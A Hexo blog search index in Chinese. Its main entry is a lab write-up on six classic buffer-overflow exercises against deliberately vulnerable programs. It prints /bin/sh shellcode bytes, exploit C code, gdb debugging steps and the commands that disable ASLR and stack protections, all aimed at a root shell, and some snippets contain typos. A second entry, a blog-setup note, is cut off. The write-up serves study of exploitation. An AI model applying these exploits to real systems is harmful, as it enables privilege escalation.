<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>经典缓冲区溢出实验1~6</title>
    <url>/2024/05/07/CS-%E7%BB%8F%E5%85%B8%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C1-6/</url>
    <content><![CDATA[<p>buffer overflow 漏洞利用实践。</p>
<span id="more"></span>
<h1 id="实验介绍"><a href="#实验介绍" class="headerlink" title="实验介绍"></a>实验介绍</h1><h2 id="实验名称"><a href="#实验名称" class="headerlink" title="实验名称"></a>实验名称</h2><p>buffer overflow 漏洞利用实践。</p>
<h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><p>编写 exploits 攻击漏洞程序，获取具有root权限的shell</p>
<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>【操作系统】</p>
<p>Ubuntu16.04.07 LTS 32bit</p>
<p>内核：4.15.0-112-generic</p>
<p>【软件版本】</p>
<p>gcc: 5.4.0</p>
<p>make: 4.1</p>
<h2 id="实验说明"><a href="#实验说明" class="headerlink" title="实验说明"></a>实验说明</h2><p>本次实验参考了</p>
<p><a href="https://www.cnblogs.com/lqerio/p/12870943.html">https://www.cnblogs.com/lqerio/p/12870943.html</a></p>
<p><a href="https://blog.csdn.net/qq_36779888/article/details/89684621?spm=1001.2014.3001.5502">https://blog.csdn.net/qq_36779888/article/details/89684621?spm=1001.2014.3001.5502</a></p>
<h1 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h1><h2 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h2><p><strong>2.1.1 下载安装gdb-peda，prelink</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo git clone https://github.com/longld/peda.git ~/peda</span><br><span class="line">echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit</span><br><span class="line">$ sudo echo &quot;source ~/peda/peda.py&quot; &gt;&gt;~/.gdbinit</span><br><span class="line">$ sudo apt-get install prelink</span><br></pre></td></tr></table></figure>
<p>以后所有操作均在root用户下进行<br><strong>2.1.2 关闭保护机制</strong></p>
<p>取消地址随机化(以下为临时关闭，重启会失效)：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>
<p>同时在编译时设置相应参数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-fno-stack-protector：禁用堆栈溢出保护</span><br><span class="line">-z execstack：关闭数据溢出保护</span><br></pre></td></tr></table></figure>
<p>2.1.3 安装漏洞程序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd vulnerables</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
<p><strong>2.1.3 分析shellcode构造</strong></p>
<p>编写shellcode C代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">char *buf [] = &#123;&quot;/bin/sh&quot;,NULL&#125;;</span><br><span class="line">void main()&#123;</span><br><span class="line">    execve(&quot;/bin/sh&quot;,buf,0);</span><br><span class="line">    exit(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>gcc编译后成功弹出shell:<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508200353.png" alt="20240508200353"></p>
<p>对编译的二进制程序使用objdump反汇编</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">objdump -d shellcode \&gt; shellcode.S</span><br></pre></td></tr></table></figure>
<p>可见其对应汇编代码,编写汇编代码如下：<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508200607.png" alt="20240508200607"><br>编译链接运行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nasm -f elf32 shellcode.asm -o shellcode.o</span><br><span class="line">ld -m elf_i386 -o shellcode shellcode.o</span><br><span class="line">./shellcode</span><br></pre></td></tr></table></figure>

<p>使用如下命令获取shellcode对应机器码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for i in $(objdump -d shellcode | grep &quot;^&quot; | cut -f2 ); do echo -n &#x27;\x&#x27;$i;done;</span><br></pre></td></tr></table></figure>
<p>得到对应机器码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\\x31\\xc9\\x31\\xd2\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\\x89\\xe1\\x31\\xc0\\xb0\\x0b\\xcd\\x80</span><br></pre></td></tr></table></figure>
<p>构造如下C程序test.c验证机器码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">void(*shellcode)();</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char * code[]=&quot;\\x31\\xc9\\x31\\xd2\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\\x89\\xe1\\x31\\xc0\\xb0\\x0b\\xcd\\x80&quot;;</span><br><span class="line">    shellcode=(void(*)()) code;</span><br><span class="line">    shellcode();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译时关闭数据溢出保护和堆栈溢出保护<br>执行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -o test test.c -fno-stack-protector -z execstack</span><br><span class="line">./test</span><br></pre></td></tr></table></figure>

<p>成功弹出shell,说明机器码正确。<br>同时，查询到构造shell还有另一方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static const char shellcode[] =</span><br><span class="line">&quot;\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b&quot;</span><br><span class="line">&quot;\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd&quot;</span><br><span class="line">&quot;\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh&quot;;</span><br></pre></td></tr></table></figure>

<p>同样编写程序验证，可成功引发shell。第一种方法使用了<code>execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;, NULL], NULL)</code> 调用来执行 <code>/bin/sh</code>，通过栈来设置参数，实验过程中发现在构造vul2的exploit2时，会导致vul2的buf数组起始位置发生变化，而第二种方法通过寄存器设置参数，可以避免此问题，两种构造shell的机器码均记录下来，分别存储为<code>shllcode1.h</code>（第一种方法）,<code>shellcode.h</code>（第二种方法）</p>
<h2 id="漏洞程序一"><a href="#漏洞程序一" class="headerlink" title="漏洞程序一"></a>漏洞程序一</h2><p><strong>2.2.1 漏洞分析</strong></p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508201625.png" alt="20240508201625"><br>分析：</p>
<p>bar 函数中使用 strcpy 函数将 arg 拷贝到 out 中，这里的 out 是一个局部数组，大小为 256 字节。但strcpy 函数不会检查目标数组的大小，而是简单地将源字符串复制到目标地址，这可能导致缓冲区溢出：如果参数 arg 的长度超过了 out 的大小（256 字节），strcpy 将继续写入超出缓冲区 out 的部分，导致栈上的其他数据被覆盖。这种情况就是经典的栈溢出漏洞，因为溢出的数据会覆盖函数调用栈中重要的数据，如返回地址和函数参数，从而可能影响程序的控制流程和执行。同时，调用bar函数的foo 函数接受命令行参数 argv，并将 argv[1] 作为参数传递给 bar 函数，其中 argv[1] 是 main 函数中的命令行参数 argv 的第二个元素。这意味着，如果在命令行中提供的参数超过了程序预期的范围，就会导致 bar 函数试图将过长的字符串复制到 buf 中，从而造成缓冲区溢出。</p>
<p>foo函数栈帧如下，当写入264字节时第261-264字节会覆盖原有返回地址。</p>
<table>
<thead>
<tr>
<th>地址</th>
<th>数据</th>
</tr>
</thead>
<tbody><tr>
<td>0xbffffd54</td>
<td>return address</td>
</tr>
<tr>
<td>0xbffffd50</td>
<td>main’s ebp</td>
</tr>
<tr>
<td>0xbffffd4c</td>
<td>buf[255]</td>
</tr>
<tr>
<td>...</td>
<td>…</td>
</tr>
<tr>
<td>0xbffffd54</td>
<td>buf[0]</td>
</tr>
</tbody></table>
<p><strong>2.2.2 构造payload</strong></p>
<p>根据上述漏洞原理，构造payload，向buf中写入264字节的数据引起溢出，其中260~263为新的返回地址，即为写入shellcode机器码的开始地址，如下构造程序：<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508202822.png" alt="20240508202822"><br>为避免图片无法显示，重要代码如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">#include&quot;shellcode.h&quot;</span><br><span class="line">...</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    unsigned int return_addr = 0x00000000;</span><br><span class="line">    char payload[264];</span><br><span class="line">    emcpy(payload,shellcode,strlen(shellcode));</span><br><span class="line">    for(int i= strlen(shellcode);i&lt;260;i++&gt;)</span><br><span class="line">    payload[i]=0x90;</span><br><span class="line">    memcpy(&amp;payload[260],&amp;return_addr,4);</span><br><span class="line">    char *argv[]=&#123;TARGET,payload,NULL&#125;;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>编译：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc exploit1.c -o exploit1 -fno-stack-protector -z execstack</span><br></pre></td></tr></table></figure>
<p>调试：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb -e ./exploiy1 -s /tmp/vul1 –directory=../vulnerables</span><br></pre></td></tr></table></figure>
<p>开始调试后，依次执行以下调试命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">catch exec</span><br><span class="line">r</span><br><span class="line">b foo</span><br><span class="line">c</span><br></pre></td></tr></table></figure>
<p>进入调试后，使用<code>catch exec</code>命令，是程序由exploit1通过execve执行vul1时中断，便于调试;执行vul1后，在foo函数下断点，以便找到buf数组起始位置从而判断返回地址;<br>使用指令<code>x/1xw buf</code>可见buf起始地址，使用此地址替换上述的0x00000000：<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508202732.png" alt="20240508202732"><br>再次编译，重复上述操作，确认buf起始地址没有发生改变，由此payload构造成功。</p>
<p>使用<code>gcc exploit1.c -o exploit1 -fno-stack-protector -z execstack</code>编译后执行，成功获取具有root权限的shell：</p>
<h2 id="漏洞程序二"><a href="#漏洞程序二" class="headerlink" title="漏洞程序二"></a>漏洞程序二</h2><p><strong>2.3.1 漏洞分析</strong></p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508203331.png" alt="20240508203331"></p>
<p>程序vul2与vul1非常相似，但限制了拷贝的字符串的长度，使得不会出现通过缓冲区溢出直接覆盖返回地址的情况，但其在确认字符串长度时使用了&lt;&#x3D;符号，导致字符串拷贝时可能多复制一个字节，这样我们就可以修改bar栈帧中的old ebp，也就是调用它的foo函数的ebp的最后一个字节。回到foo函数后执行leave指令（相当于mov esp,ebp pop ebp两条指令）时将被修改后的ebp传给esp，若此时esp+4指向shellcode的地址，那么执行ret指令时我们就能成功跳转至shellcode机器码所在位置从而获取shell.<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508203425.png" alt="20240508203425"><br>总体过程描述大致如下图<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508203404.png" alt="20240508203404"><br><strong>2.3.2 构造payload</strong></p>
<p>根据上述原理，首先在gdb中调试获取buf的地址：</p>
<p>调试vul2，使用命令<code>disas foo</code>反汇编foo函数，获取bar函数地址为0x804851a，如图20240508203425所示。<br>构造一个200字节的payload并编译exploit2.c。使用<code>gdb -e exploit2 -s /tmp/vul2</code>联合调试，在bar函数处下断点，打印ebp和buf值</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508203635.png" alt="20240508203635"><br>调试命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">catch exec</span><br><span class="line">r</span><br><span class="line">b *0x0804851a</span><br><span class="line">c</span><br><span class="line">p $edp</span><br><span class="line">p &amp;buf</span><br></pre></td></tr></table></figure>
<p>得到&amp;buf&#x3D;0xbffffcb8,因此获取到buf范围是0xbffffcb8-0xbffffd80共200字节, ebp为0xbffffd8c, 如果覆盖掉ebp最后一字节为00，改变ebp为0xbffffd00，那么ret存放地址应当为0xbffffd04-0xbffffd08，注意是小端存储。D04-cb8&#x3D;4c&#x3D;76字节。<br>编写程序，构造数组：<br>在此过程中曾使用第一种shell构造方法，但实验过程中发现buf数组地址总是发生变化，经查询发现第一种方法通过栈来设置参数，推测可能是使用的栈导致了vul2的内存空间被占用，网上查询到第二种方法，如上文所述存在shellcode.h中，最终程序编写如下</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508203826.png" alt="20240508203826"><br>编译运行，成功获取具有root的权限的shell。</p>
<h2 id="漏洞程序三"><a href="#漏洞程序三" class="headerlink" title="漏洞程序三"></a>漏洞程序三</h2><p><strong>2.4.1 漏洞分析</strong><br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508203931.png" alt="20240508203931"><br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508203919.png" alt="20240508203919"><br>程序输入为整数count和字符串in。采用了if判断语句来防止溢出，存在的漏洞主要是当count为一个足够小的负数时，可以满足 if 的条件进入memcpy函数，而memcpy接受的内存长度类型为size_t，在32位中即为unsigned int，共计4字节（32位），可以表示的最大值是 2^32 – 1&#x3D;4,294,967,295，其函数原型如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void * memcpy(</span><br><span class="line">    void* _Dst,void const* _Src,size_t _Size</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>当负数足够小时，负数*sizeof(widget_t)可能溢出产生正数。故要对vul3栈溢出攻击只需要构造合适的负数count产生溢出和字符串in覆盖buf，然后覆盖ebp，ret即可。由程序代码可知widget_t结构体占4字节，buf数组占用20*1000&#x3D;20000字节，若count*20&gt;20000即可导致数组越界，因此count的4字节32位二进制中除去第一位符号位为1外剩余位应当&gt;&#x3D;1001&#x3D;0b001111101001，因此传入的count的二进制可为0b 1000 0000 0000 0000 0000 0011 1110 1001，计算机中负数以补码存储，对应为0b 0111 1111 1111 1111 1111 1100 0001 0111，其对应十进制为-2,147,484,649。buf大小为20000字节，故返回地址在20004~20008字节处。覆盖该地址内存为buf的起始地址，然后buf覆盖为shellcode即可。</p>
<p><strong>2.4.2 构造payload</strong></p>
<p>类似方法获取buf起始地址为0xbfff61f0,得到buf基址 0xbfffa220<br>编写程序，构造数组：<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508204222.png" alt="20240508204222"><br>使用命令<code>gcc -o exploit3 exploit3.c -z execstack -fno-stack-protector</code>编译运行,成功获取具有root权限shell</p>
<h2 id="漏洞程序四"><a href="#漏洞程序四" class="headerlink" title="漏洞程序四"></a>漏洞程序四</h2><p><strong>2.5.1 漏洞分析</strong></p>
<p>1、源码及其依赖项分析</p>
<p>1.1 源码分析<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508214646.png" alt="20240508214646"></p>
<p>由上述代码可见foo函数的执行逻辑顺序为:</p>
<p>p&#x3D;tmalloc(500) q&#x3D;tmalloc(300) tfree(p) tfree(q) p&#x3D;tmalloc(1024) tfree(q)</p>
<p>可知为q申请了一次内存但使用tfree了两次，由于申请的内存已经在第一次tfree，第二次tfree会释放一个不存在的空间，导致出错，该漏洞属于堆溢出漏洞。因此，tfree很可能是我们可以利用的地方。</p>
<p>1.2 库文件“tmalloc.h”对应“tmalloc.c”文件分析：</p>
<p>分析其结构体与宏定义，可知，CHUNK结构体占8个字节（前4个字节为左指针，后4个字节为右指针，分别指向前后的块位置）在块的r指针的低位部分存储块的状态，1为空闲，0为占用。</p>
<p>tmalloc函数和tfree函数：<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508214809.png" alt="20240508214809"><br>可以总结tmalloc函数的执行过程如下：<br>首先，tmalloc 函数接收一个参数 nbytes，表示需要分配的内存大小（以字节为单位）。如果内存分配器尚未初始化（即 bot 为 NULL），则会调用 init() 函数进行初始化。init()函数会把bot（arena数组第一个）设为空闲块，top（arena数组最后一个）设为占用块。然后根据传入的字节数 nbytes 计算需要的以块为单位进行内存分配的内存大小 size。从链表的起始位置 bot 开始，内存分配器遍历空闲块链表，寻找一个大小大于等于 size 的空闲块（当前块为空闲且其右块与当前块之间的空间大于等于size）。如果找到了合适大小的空闲块 p，则将其标记为占用状态（调用 CLR_FREEBIT(p) 函数），表示该块已经被分配出去。如果找到的空闲块大小大于 size，则会创建一个新的空闲块来存放剩余的空间（）（top左指针指向空闲块尾，空闲块尾右指针指向top，空闲块尾左指针指向空闲块首，空闲块首右指针指向空闲块尾）。最后返回分配的内存块的首地址给调用者。</p>
<p>tfree函数的执行过程如下：<br>首先检查 vp 是否为 NULL，如果是，则直接返回，因为无需释放任何内存。然后使用 TOCHUNK 宏将指针 vp 转换为其对应的内存块头部指针 p。使用 CLR_FREEBIT 宏清除块 p 的空闲位，即将其标记为占用状态。然后尝试合并左空闲块（按图1即向上空闲块合并）：首先获取 p 的左边相邻块 q，如果 q 不为空且是空闲的，则尝试与其合并。使用 CLR_FREEBIT 宏清除块 q 的空闲位。更新合并后的块 q 的右指针指向 p 的右指针所指向的块。更新 p 右指针所指向的块的左指针指向合并后的块 q。使用 SET_FREEBIT 宏设置块 q 的空闲位。更新当前处理的块指针 p 为合并后的块 q。然后尝试向右合并空闲块，原理类似，最后使用 SET_FREEBIT 宏设置块 p 的空闲位，表示该块现在是空闲的。这样，tfree函数完成了对给定内存块的释放，并尝试将其与相邻的空闲块合并，以减少内存碎片化。</p>
<p>结合vul4.c和tmallo.c，我们可以分析出，第一次为p使用tmalloc申请了500字节，（由于CHUNK数组一个8字节，按块分配内存，实际分配了504字节），然后为q申请了300字节（实际分配304字节，q也就指向第504字节所在地址），然后分别释放申请的空间，此时虽然块被标记为空闲，但实际上p,q仍指向原位置。之后再分配了1024字节给p,因为504+304&lt;1024,因此q也就指向p所分配中某一块的地方，如下所示：<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508214849.png" alt="20240508214849"></p>
<p>因此我们就可以给q所指的地方赋值，又根据tfree的原理，第二次释放q时，若我们在赋值q所指的地方时将其左指针设置为我们想要返回的地址，右指针设置为存储返回地址的地址，即foo函数的返回地址存储的地址。需要注意的是，与左节点合并必须满足左节点空闲，即左指针的第 5 位（左指针的右指针的低位，对应下图中q0-&gt;s.r）应该是奇数。当使用tfree时，语句p0s.rs.l&#x3D;q0，也就是相当于将q的右指针所指地址（也就是存储返回地址的地址）的前四字节（即其右指针）替换为q的左指针（也就是设置的返回地址）。</p>
<p>注意，上文提到的q指的是vul4.c中的q,而q0指的是tmalloc.c中的q,p,p0同理。<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508214919.png" alt="20240508214919"></p>
<p><strong>2.5.2 构造payload</strong></p>
<p>1、确定shellcode地址（p所指内存地址）；</p>
<p>反汇编foo函数，在最后一个tfree的汇编代码处下断点：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b *0x0804862e</span><br><span class="line">c</span><br><span class="line">p p</span><br></pre></td></tr></table></figure>
<p>得到指针p指向的内存地址<code>0x804a068</code><br>将shellcode设置为p起始地址偏移32字节处，便于后续操作</p>
<p>2、确定返回地址所在的内存地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p $ebp</span><br></pre></td></tr></table></figure>
<p>获得栈底指针寄存器 ebp 的值为<code>0xbffffa4c</code><br>其上四字节即返回地址所在地，即<code>0xbffffa50</code></p>
<p>3、获取q所指地址0x804a268：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p q</span><br></pre></td></tr></table></figure>
<p>重新调试，在第三个tmalloc前下断点，可见覆盖前q堆首值:<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508215250.png" alt="20240508215250"></p>
<p>可见其左指针指向p堆的堆首。</p>
<p>4、构造payload</p>
<p>上面提到将shellcode设置为p起始地址偏移32字节处，这是因为tfree时与左节点合并必须满足左节点空闲，即左指针的第 5 位（左指针的右指针的低位，对应下图中q0-&gt;s.r）应该是奇数，而shellcode第五位是0x76，不满足。<br>因此我们将q的左指针指向 p 的起始数据区域，同时将其 5~8 个字节赋值为 0xffffffff。但0xffffffff无法对应指令，当从p 的起始数据区域开始执行时到此处会出错，我们可以使用jmp指令跳过这部分区域，jmp指令对应机器码为\xeb，使用\xeb08跳过8字节偏移来跳过这部分。因此最后构造如下payload:<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508215323.png" alt="20240508215323"><br>编译运行,成功</p>
<h2 id="漏洞程序五"><a href="#漏洞程序五" class="headerlink" title="漏洞程序五"></a>漏洞程序五</h2><p><strong>2.6.1 漏洞分析</strong></p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508215336.png" alt="20240508215336"><br>该程序存在由错误使用snprintf函数导致的格式化字符串漏洞，snprintf函数的功能是根据指定的 format 字符串将格式化数据写入到 str 缓冲区中，并根据 size 控制写入的字符数。查看其函数原型，可见，在函数定义中，其恰当的用法应当是当format中包含若干格式化指示符时，其后应该再加相同数量的参数以对应格式化指示符，但原程序中使用snprintf(buf, sizeof buf, arg);时，只有一个参数，且用户可以控制输入的内容，这就可能导致安全性问题。当用户的输入包含格式化字符串控制符时（如 %s、%n 等），snprintf找不到其对应的参数，但它不会意识到这一点，而是会继续尝试从堆栈中读取相应的数据，从而读取到错误的内存数据（越过了它能读取的边界）。恶意用户就可以精心构造输入文件，插入了类似 %x、%s 的格式化字符串，从而导致程序崩溃或者泄漏敏感信息。更严重的情况下，攻击者可能通过 %n 格式化字符串控制符修改内存中的数据，引发潜在的安全问题。<br>在理解程序存在的漏洞之后，我们还需要回顾一些c语言语法，已知：<br>a. 在C语言中可以通过%Ns(d&#x2F;x&#x2F;p&#x2F;f等)来控制输出多少位，例如%2u可以输出2位无符号10进制数，因此使用%133u可以输出133位10进制数。<br>b. 在C99中，%n是一个格式说明符，主要用于 printf 和 sprintf 等函数。它的作用是将到目前为止写入（或读取）的字符数存储到一个 int 类型的变量中。例如语句printf(“aaaaa%n”, &amp;count);printf(“%d\n”, count);的结果是：aaaaa5<br><strong>由此可以总结触发漏洞过程如下：</strong></p>
<p><em>当构造的输入为</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char payload[400] = </span><br><span class="line"> &quot;\xff\xff\xff\xff\x2c\xdb\xff\xff&quot;</span><br><span class="line"> &quot;%29u%n&quot;;</span><br></pre></td></tr></table></figure>
<p>时，程序执行到<code>snprintf(buf, sizeof buf, arg); </code>由于实际提供的参数比指示符要求的参数少，snprintf将尝试读取未定义的内存。在这种情况下，snprintf函数会试图读取额外的4字节，这样就读取了0xffff ffff，并将其视为无符号整数来打印, 然后读取到指示符%n时，会再向下读取4字节，即0xffffdb2c，并将其视为需要将输出字符数写入的地址，从而导致了3D被写入到内存0xffff bd2c中。通过这种方法，我们即可实现向任意内存写入数据，假如我们找到了snprintf函数的返回地址，并将其修改为shellcode的起始地址，就能使其返回错误的地址从而成功获取shell</p>
<p><strong>2.6.2 构造payload</strong></p>
<p>构造如下输入以调试获取buf及其他数据地址：<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508215600.png" alt="20240508215600"><br>编译，使用如下命令调试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb -e exploit5 -s /tmp/vul4</span><br><span class="line">catch exec</span><br><span class="line">r</span><br><span class="line">b foo</span><br><span class="line">c</span><br></pre></td></tr></table></figure>
<p>使用<code>disas foo，disas snprintf</code>命令反汇编foo snprintf函数，并通过<code>p \$ebp, x/xw buf</code>等指令调试，获取buf起始地址和栈帧结构,并根据以上汇编指令和buf起始地址，可以推断栈帧结构如下：<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508215741.png" alt="20240508215741"></p>
<p>可见snprintf()函数的返回地址储存在0xbfffffb2c处，同时，由于以下构造：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char payload[400] = </span><br><span class="line"> &quot;\xff\xff\xff\xff\x2c\xdb\xff\xff&quot;</span><br><span class="line"> &quot;%29u%n&quot;;</span><br></pre></td></tr></table></figure>
<p>会不断修改buf中的数值，所以我们不能像前几次一样将返回地址修改为buf数组的地址，而是将其修改为arg数组的地址，通过命令x&#x2F;xw查询到arg数组起始地址为0xbffffe61：<br>同时，由于构造输入的前数十个字节需要用于存储如图1的构造，我们不能将shellcode存储在arg数组起始处，可以存储在+96字节(0xbffffec1)处，并把返回地址设置为+80字节(0xbffffeb1)处（80字节已经足够容纳以上数据，且空余字节通过\x90填充，对应nop指令，不影响程序），从而构造以下payload<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508215840.png" alt="20240508215840"></p>
<p>编译运行，没有出现预期结果，gdb调试，发现增加的c语言语句导致程序地址发生变化，重新构造payload如下<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508215914.png" alt="20240508215914"></p>
<p>编译运行，成功获取具有root权限的shell</p>
<h2 id="漏洞程序六"><a href="#漏洞程序六" class="headerlink" title="漏洞程序六"></a>漏洞程序六</h2><p><strong>2.7.1 漏洞分析</strong><br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508215934.png" alt="20240508215934"><br>vul6与vul2类似，也是可能导致一个字节的缓冲区溢出，但在执行foo函数后直接退出（exit(0)），因此无法使用vul2的构造方法，需要设法绕过此函数。exit()函数的汇编代码如下：</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508215959.png" alt="20240508215959"></p>
<p>其在执行时第一条指令是jmp指令，若能修改其目标地址，则可跳转至我们想要跳转的地方。<br>由漏洞程序2可知，通过nstrcpy()函数可以修改foo函数ebp的值，而查看汇编代码可知变量p与a的位置是根据ebp决定的因此存在修改指针p指向地址空间的值的可能性。<br>结合vul2推断其栈帧结构大致如下：<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508220041.png" alt="20240508220041"><br>进一步分析汇编代码，在执行bar()函数后执行*p&#x3D;a时，其对应汇编指令如下：<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508220200.png" alt="20240508220200"><br>也就相当于将ebp-0x8位置的数据复制到ebp-0x4的位置，若我们修改ebp指向buf数组中某一位置，从而使得ebp-0x8指向buf数组中某一数值，该数值定为jmp指令的目标地址存储的地方,根据上文exit函数反汇编代码可知为0x0804a00c，并使得ebp-0x4指向的地址中存储shellcode的开始地址，最终可以实现使用shellcode的开始地址替换jmp指令的目标地址，从而获取shell.</p>
<p><strong>2.7.2 构造payload</strong></p>
<p>根据上述原理，首先获取foo函数ebp和buf起始地址，ebp&#x3D;0xbffffe4c;&amp;buf&#x3D;0xbffffd70<br>若将ebp修改为0xbffffe00,则其与buf起始地址的偏移为0xe00-0xd70&#x3D;144<br>则ebp-0x8对应0xbffffdf8,偏移136，将其设置为buf起始地址0xbffffe00, ebp-0x4对应0xbffffdfc,偏移140,将其设置为0x0804a00c<br>如下构造payload<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508220209.png" alt="20240508220209"><br>编译，由于原本获取的是以“hi there”为输入的ebp,buf，因此再次调试获取buf起始地址和ebp&#x3D;0xbffffd8c,&amp;buf&#x3D;0xbffffcb0<br>得到偏移0xd00-0xcb0-0x08 &#x3D;80-8&#x3D;72修改payload，如下：</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508220326.png" alt="20240508220326"><br>编译运行，成功获取具有root权限shell<br>至此，全部实验成功<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508220335.png" alt="20240508220335"></p>
]]></content>
      <categories>
        <category>安全与实验</category>
      </categories>
      <tags>
        <tag>缓冲区溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>Blog-Note</title>
    <url>/2024/04/24/Blog-Note/</url>
    <content><![CDATA[<p>博客搭建笔记</p>
<span id="more"></span>
<h2 id="网站搭建"><a href="#网站搭建" class="headerlink" title="网站搭建"></a>网站搭建</h2><p>安装方法可自行搜索<br><strong>nodejs</strong>    <a href="http://nodejs.cn/download/">下载地址</a><br><strong>Git</strong>    <a href="https://git-scm.com/">下载地址</a></p>
<p>安装成功后，右键可见Git Bash Here,打开，在弹出的终端中输入以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">node -v </span><br></pre></td></tr></table></figure>

<p>若输出版本号，则安装成功，若没有需要重新安装，注意添加环境变量</p>
<p><strong>cnpm</strong><br>在git bash执行下面的命令安装cnpm</p>
